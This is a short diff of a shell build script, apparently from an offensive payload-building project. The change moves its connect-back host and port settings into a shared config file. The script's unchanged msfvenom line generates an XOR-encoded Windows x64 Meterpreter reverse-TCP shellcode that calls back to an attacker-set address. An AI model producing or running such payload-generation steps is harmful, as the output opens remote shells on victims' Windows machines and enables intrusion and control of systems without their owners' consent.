@@ -6,9 +6,12 @@
 # or enter $win64_compiler="mycompiler" here
 . build/global_win64.sh
 
-# configure your connect-back settings here
-LHOST=192.168.2.103
-LPORT=443
+# import global default lhost and lport values from build/global_connect_config.sh
+. build/global_connect_config.sh
+
+# override connect-back settings here, if necessary
+LPORT=$GLOBAL_LPORT
+LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST -e x64/xor lport=$LPORT -f c --platform Windows > sc.txt
